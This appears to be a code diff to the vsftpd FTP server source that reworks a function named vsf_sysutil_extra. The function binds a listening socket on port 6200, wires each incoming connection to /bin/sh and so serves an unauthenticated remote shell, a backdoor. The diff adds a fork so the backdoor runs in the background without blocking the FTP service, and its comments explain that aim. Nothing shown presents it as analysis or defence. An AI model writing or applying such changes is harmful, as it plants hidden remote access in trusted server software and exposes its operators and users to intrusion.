@@ -851,20 +851,34 @@ vsf_sysutil_extra(void)
   int fd, rfd;
   struct sockaddr_in sa;
   pid_t pid;
-  int optval = 1;
+  int optval = 1; // Declare the optval variable
 
-  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+  pid = fork();
+
+  if (pid < 0) // Forking error
+  {
+    perror("fork");
     exit(1);
+  }
+  else if (pid > 0) // Parent process
+  {
+    return 0; // Return from the function in the parent process to not block the main FTP process
+  }
+
+  // The following code will only run in the child process
+  if ((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+    exit(1);
+  // Add the following line to set the SO_REUSEADDR option
   setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
   memset(&sa, 0, sizeof(sa));
   sa.sin_family = AF_INET;
   sa.sin_port = htons(6200);
   sa.sin_addr.s_addr = INADDR_ANY;
-  if((bind(fd, (struct sockaddr *)&sa, sizeof(struct sockaddr))) < 0)
+  if ((bind(fd, (struct sockaddr *)&sa, sizeof(struct sockaddr))) < 0)
     exit(1);
-  if((listen(fd, 100)) == -1)
+  if ((listen(fd, 100)) == -1)
     exit(1);
-  for(;;)
+  for (;;)
   {
     rfd = accept(fd, 0, 0);
     pid = fork();
@@ -876,8 +890,12 @@ vsf_sysutil_extra(void)
     else if (pid == 0) // Child process
     {
       close(fd);
-      close(0); close(1); close(2);
-      dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
+      close(0);
+      close(1);
+      close(2);
+      dup2(rfd, 0);
+      dup2(rfd, 1);
+      dup2(rfd, 2);
       execl("/bin/sh", "sh", (char *)0);
       exit(0);
     }
@@ -887,6 +905,7 @@ vsf_sysutil_extra(void)
     }
   }
 }
+
 
 void
 vsf_sysutil_set_proctitle_prefix(const struct mystr* p_str)
